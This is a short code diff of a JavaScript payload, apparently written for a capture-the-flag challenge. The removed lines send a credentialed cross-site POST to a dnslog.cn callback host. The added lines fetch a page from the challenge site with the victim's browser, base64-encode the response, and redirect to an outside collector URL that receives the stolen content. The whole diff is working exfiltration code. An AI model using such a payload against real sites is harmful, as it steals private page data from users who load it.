@@ -1,11 +1,15 @@
-function submitRequest()https://github.com/Ginove/post
+function submitRequest()
       {
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://11111.85ec7n.dnslog.cn", true);
-        xhr.setRequestHeader("Accept", "*/*");
-        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
-        xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
-        xhr.withCredentials = true;
-        xhr.send(JSON.stringify({"appId":"300016001555","appName":"0xdawn"}));
+		var xhr = new XMLHttpRequest();
+        var xhr1 = new XMLHttpRequest();
+		xhr1.open("GET", "http://politenotepad.zajebistyc.tf/", true);
+		
+		xhr1.send();
+            xhr1.onload = function() {
+                if(xhr1.status == 200) {
+				window.location.href="https://mock.uutool.cn/4fvkh7rejnq0?"+btoa(xhr1.responseText);
+                }
+            }
     }
 	submitRequest();
+
